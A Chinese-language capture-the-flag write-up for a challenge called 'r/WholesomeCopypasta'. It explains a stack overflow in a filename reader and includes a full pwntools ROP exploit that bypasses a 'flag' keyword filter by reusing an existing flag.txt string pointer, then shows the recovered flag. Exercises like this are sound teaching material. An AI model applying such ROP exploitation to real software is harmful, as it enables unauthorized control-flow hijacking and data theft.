# Greycademy2025 r/WholesomeCopypasta

## 题目简述

程序只列出三份普通文本，并拒绝文件名中出现 `flag`、`/` 或 `\`。但它把最多 `0x100` 字节读入 100 字节栈数组，形成可控的返回地址覆盖；目标是通过 ROP 调用已有文件输出函数读取 `flag.txt`。

## 解题过程

关键源码如下：

```c
char filename[100];
size_t end = read(0, filename, 0x100);

if (strstr(filename, "flag") || strchr(filename, '/') || strchr(filename, '\\'))
    exit(0);

print_file_contents(filename);
```

二进制无 Canary、无 PIE，NX 开启。返回地址偏移为 `0x88`。不能把 `flag.txt` 直接放进前面的 `filename`，否则过滤器会命中；不过全局数组 `copypastas` 已经包含指向字符串 `flag.txt` 的指针，字符串地址固定为 `0x400c59`。已有函数 `print_file_contents` 的地址也固定。

先让正常路径读取 `bob.txt`，并用 NUL 提前结束文件名；随后覆盖返回地址，以 ROP 再调用一次 `print_file_contents(0x400c59)`：

```python
from pwn import *

context.binary = elf = ELF("./challenge")
rop = ROP(elf)
rop.call(rop.ret)  # 保持调用前的 16 字节栈对齐
rop.print_file_contents(0x400c59)

payload = b"bob.txt\x00".ljust(0x88, b"A")
payload += rop.chain()

p = process("./challenge")
p.sendline(payload)
print(p.recvall().decode())
```

第二次函数调用输出：

```text
grey{r0p3d_1n_th3_flag!}
```

## 方法总结

过滤器只检查原始输入字符串，不能约束控制流被劫持后使用的参数。利用已有的全局 `flag.txt` 字符串，既避开输入过滤，也不需要向内存另写路径。额外的 `ret` 用于满足 System V AMD64 ABI 的栈对齐要求，是让 libc 内部调用稳定执行的重要细节。
